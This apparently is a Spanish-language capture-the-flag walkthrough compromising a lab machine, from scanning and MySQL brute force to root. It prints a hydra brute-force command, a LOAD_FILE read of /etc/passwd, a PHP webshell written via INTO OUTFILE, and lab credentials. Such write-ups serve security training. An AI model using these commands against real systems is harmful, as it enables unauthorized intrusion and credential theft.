Hacemos el escaneo de nmap:
![[Pasted image 20240229092650.png]]
Esto es lo que corre por el puerto 80:
![[Pasted image 20240229092717.png]]
Probamos en hacer fuzzing web y vemos un archivo index.php:
![[Pasted image 20240229094609.png]]



Debemos de hacer OSINT de esta imagen, donde tenemos una web que se llama yandex.com:
```bash
https://yandex.com/
```
Donde se puede subir una imagen y nos hace una investigación sobre ella, donde vemos los usuarios beavis y buthead:
![[Pasted image 20240229093159.png]]
Llegados a este punto podemos hacer un ataque de fuerza bruta contra la base de datos MySQL utilizando hydra:
```bash
hydra -t 64 -l beavis -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.8
```
Una vez obtenida la contraseña, vamos a entrar en la base de datos y listamos las databases:
```bash
mysql -h 10.10.10.8 -u beavis -p
rocknroll
```
![[Pasted image 20240229093954.png]]
Y por aquí tenemos dos credenciales:
![[Pasted image 20240229094026.png]]
```bash
beavis:b3@v1$123
butthead:BuTTh3@D!
```
También dentro de la base de datos es posible leer archivos, por ejemplo el /etc/passwd:
```bash
SELECT LOAD_FILE("/etc/passwd");
```
![[Pasted image 20240229094422.png]]
Ahora si apuntamos contra el archivo index.php que veíamos al principio, podemos ver un comentario dentro de dicho archivo con una ruta:
![[Pasted image 20240229094814.png]]
Lo ponemos en el navegador y sale esto:
![[Pasted image 20240229094859.png]]
En este punto, probamos en cargar una webshell desde la base de datos:
```bash
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/M3t4LL1c@/shell.php";
```
![[Pasted image 20240229095007.png]]
Y obtenemos ejecución remota de comandos:
![[Pasted image 20240229095035.png]]
Codificamos el código de la reverse shell:
![[Pasted image 20240229095349.png]]
Ejecutamos el payload y obtenemos la reverse shell:
![[Pasted image 20240229095438.png]]
Y al ejecutar el comando sudo -l vemos que podemos ejecutar batcat como el usuario beavis:
![[Pasted image 20240229095629.png]]
Seguimos las instrucciones de gtfobins y vemos que nos convertimos en el usuario beavis:
![[Pasted image 20240229095717.png]]
![[Pasted image 20240229095725.png]]
Siendo beavis no enumeramos nada más, pero sí podemos convertirnos en el usuario butthead reutilizando sus credenciales obtenidas de la base de datos:
```bash
butthead:BuTTh3@D!
```
![[Pasted image 20240229100105.png]]
Y si de forma autenticada ejecutamos el comando sudo -l como este usuario, vemos que como root podemos ejecutar su:
![[Pasted image 20240229100159.png]]
Y si ejecutamos el comando sudo -u root /usr/bin/su nos convertimos en root:
![[Pasted image 20240229100311.png]]
